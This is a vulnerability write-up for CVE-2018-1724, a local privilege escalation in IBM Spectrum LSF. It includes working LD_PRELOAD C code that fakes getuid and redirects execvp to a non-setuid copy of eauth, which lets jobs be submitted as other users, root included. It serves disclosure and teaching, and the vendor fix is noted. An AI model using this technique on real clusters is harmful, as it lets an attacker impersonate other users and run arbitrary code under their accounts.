# CVE-2018-1724: IBM Spectrum LSF Local Privilege Escalation

## Overview

IBM Spectrum LSF is a set of tools designed to provide scheduling and resource management for HPC/Cluster workloads. These tools help make the cluster more efficient by fairly scheduling various user workloads, allowing users to define custom jobs, keeping track of time spent for cost recovery purposes, and orchestrating steps of a compute job across multiple compute nodes. HPC systems are typically used by multiple teams (some of which may be in competition with each other) so both horizontal and vertical privilege escalation vulnerabilities are somewhat more serious than on single-user systems. In addition, user software generally needs to be compiled specifically against local libraries in order to be optimized for HPC computational hardware and high-speed interconnect bridging the compute nodes. Bring-your-own-software is standard practice in scientific computing, so very tight policing of the userspace by the OS kernel is paramount to HPC security. Furthermore, because HPC resources are by definition clustered systems, escalation of privileges of any component often times directly translates to escalation on many components of the distributed HPC system. This vulnerability exposes a flaw in `eauth` -- one tool that LSF uses to authenticate users between multiple parts of the HPC cluster. This writeup will demonstrate how `bsub`, the job submission command, can use `eauth` to submit jobs with the context of another user (including root!).

## Links

https://www.ibm.com/products/hpc-workload-management
https://www.ibm.com/support/pages/node/734767
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1724

## Tools and Background Knowledge

  * Linux Command Line Tools
  * `strace`
  * LD_PRELOAD
  * Linux System Calls
  * Cryptography
  * Entropy
  * C / gcc
  * HPC Job Submission

## Writeup

HPC users typically log into compute resources using SSH and submit jobs through a batch scheduler system.  This scheduler will reserve computational resources as they are freed by previously completed workloads in order to optimize the use of a computational cluster.  There is an authentication boundary between submitter and job scheduler that ensures that users cannot spoof credentials and submit jobs as other users.

### Diagram
```
                    ┌────────────────────────────┐                 
                    │         Login Node         │                 
                    │                  ┌───────┐ │                 
                    │                  │ eauth │ │       ┌────────┐
                    │                  └▲─────┬┘ │     ┌─┴──────┐ │
┌─────────────┐     │                   │     │  │   ┌─┴──────┐ │ │
│   User @    │   ┌─┴─────┐  ┌──────┐  ┌┴─────▼┐ │   │Compute │ ├─┘
│ Institution ├───▶ sshd  ├──▶ bash ├──▶ bsub  │ │   │  Node  ├─┘  
└─────────────┘   └─┬─────┘  └──────┘  └──────┬┘ │   └───▲────┘    
                    │                         │  │       │         
                    └─────────────────────────┼──┘       │         
                                            ┌─▼─┐        │         
                                         ┌──┤LSF├────────┼────┐    
                                         │  └───┘     ┌──┴──┐ │    
                                         │            │Queue│ │    
                                         │            └─────┘ │    
                                         │     Scheduler      │    
                                         └────────────────────┘    
```

### bsub

To explain the process with a concrete example, the following command sends a job to the 'batch' queue.  It asks for an interactive /bin/bash shell to be launched on a single node, specifies the maximum job time to be 20 minutes, and tells the accounting system to charge the PROJ01 account for the compute time.

```
$ bsub -Is -nnodes 1 -PPROJ01 -W00:20 -qbatch /bin/bash
```


### eauth
`eauth` is a system utility provided by the LSF scheduler to protect the job submission authentication boundary.  `eauth`  outputs a secret token to standard out and is called by the user-initiated bsub process.  The output of the `eauth` command changes regularly when run consistently on the command line. This token is submitted to the job scheduler along with the compute job specifications for validation purposes.

`eauth` output (when run from the command line) looks something like this:
```
$ eauth -c $HOSTNAME
4?:?;6=2=9>68=8=:69:@=65=<483;<;
```

### Discovery

The first thing that jumps out is how simple the output of `eauth` seems to be (at least in 2018 when this work was performed!).  Increasing entropy is a sure-fire way to increase the difficulty of guessing secrets; bit-lengths of 256-512 bits (32-64 characters) are considered strong. Web-based api keys are typically this complex and much longer than `eauth` output, so brute-forcing `eauth` secrets was initially discussed as a plan of attack.


### Investigating Typical Job Submission

One of the super awesome tools that should be in the toolbox of every linux-hacker is `strace`.  `strace` lets you attach to a process that you own and capture all of the system calls that your process makes into the kernel.  This is incredibly useful during the initial 'just-trying-to-grok-this' stage of exploitation because you can see all of the various files that your process accesses, the child processes that are created, network communication that is set up, etc.  In this case, we use `strace` to see how our job submission process interacts with `eauth`.  In this instance, we are running a simple job to request a single compute node worth of compute power and launch an interactive shell -- `/bin/bash`.  The other options aren't too important for this writeup, but they mainly deal with scheduling and accounting/allocation intricacies.

```
strace -o bsub.strace -f bsub -Is -nnodes 1 -PSTF002SUMMIT -W00:20 -qbatch /bin/bash
```

After capturing `strace` output, it's immediately apparent that `bsub` is using the system-installed `eauth` during execution (presumably to grab an auth token to pass alongside the interactive `/bin/bash` job request to the job scheduler).

```
$ grep eauth bsub.strace
57143 execve("/opt/ibm/spectrumcomputing/lsf/10.1/linux3.10-glibc2.17-ppc64le-csm/etc/eauth", ["/opt/ibm/spectrumcomputing/lsf/1"..., "-c", "mgmt1"], [/* 113 vars */]) = 0
```

We do not have `eauth` source, however, and will either need to reverse engineer the binary or the submission protocol to understand how the `eauth` tokens are being generated.


### The First Roadblock: Can we even obtain a token of other users?

One awesome trick that you can use to manipulate the input or return value of function calls of closed-source (or even open-source) binaries is LD_PRELOAD. A great writeup can be found here: http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/. We can override the return value of getuid() type calls to return the numeric userid of another user on the system... if `eauth` is not validating with something trusted, like the kernel, that *our* process is owned by that uid, we might be able to get a hold of someone else's `eauth` token! This is some code (named preload.c) that will replace calls to glibc's getuid() family of functions and return the userid '1001' to your program. The setuid() function here always returns 0 to prevent your program from calling out to the kernel through the normal glibc function of that name.

```
int geteuid() {
  return 1001;
}

int getuid() {
  return 1001;
}

int setuid( int id ) {
  return 0;
}
```

We can build the shared library with `gcc` and then activate it like so:

```
$ gcc -o preload.so -fPIC -shared preload.c -ldl
$ export LD_PRELOAD=./preload.so
```


### Second Roadblock: System eauth is setuid root

The system `eauth` has setuid root permissions, and the dynamic linker knows better than to preload our shared libraries. That would be a very big security issue. That being said, since we can run `eauth`, we can copy the binary to a directory that we can write to.  This copy will not have the setuid bit set, so we are able to preload in front of *that* binary, and see if we get different strings depending on the userid that we are faking.

```
$ cp $(which eauth) .
$ echo "$(eauth -c mgmt1) ||| $(./eauth -c mgmt1)"
1:85<25>=@5?@2979=<>6;>2;@7=25?7 ||| ><68>8;22;@:3=39=?641:;7:@39:3@=
```

Success!  It seems that *our* token is the leftmost one, and user 1001's token is the rightmost one.  At this point, we are pretty sure we can generate any user's token by changing our shared library's code appropriately. Now, we must decide whether we want to reverse engineer the job submission protocol and submit jobs to LSF directly... or somehow live off the land and be lazy.


### Let's be lazy

Using the same LD_PRELOAD technique, we can override calls to external binaries by shimming exec calls to glibc.  This call eventually calls the kernel's execve systemcall, so we do not want to completely replace it... just change around the location of the `eauth` binary that `bsub` will be calling.  The following code was added to the preload.c library.  It looks for calls to execvp (which is what bsub uses) that target the system-installed eauth binary, and replaces the string with the local copy of eauth. Then, execution is passed back to the glibc verison of execve (which is set up using RTLD_NEXT magic) for everything to finish running.

```
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <string.h>
#include <dlfcn.h>
// gcc -o preload.so -fPIC -shared preload.c -ldl

int execvp(char *file, char *argv[]) {
  static int (*func)();
  if( !func ) {
    func = (int (*)()) dlsym(RTLD_NEXT, "execvp");
  }
  if( strcmp("/opt/ibm/spectrumcomputing/lsf/10.1/linux3.10-glibc2.17-ppc64le-csm/etc/eauth", file) == 0 ) {
    file = strcpy( file, "/tmp/bsub/eauth" );
  }
  return func( file, argv );
}
```

### Putting it all together

This technique lets us LD_PRELOAD several functions that fool `eauth` into giving our bsub command the token of another user. Because this token is sent with our submitted job specification, we can run arbitrary code as any user on the system.


### The fix

The fix for this is to require some sort of secret or cryptographic material that a user cannot read but that a trusted system process can. This was fixed quite quickly by the vendor, so kudos to them! Information about affected versions can be found by following the links at the beginning of this writeup.

## Acknowledgements

This research used resources of the Oak Ridge Leadership Computing Facility at the Oak Ridge National Laboratory, which is supported by the Office of Science of the U.S. Department of Energy under Contract No. DE-AC05-00OR22725.
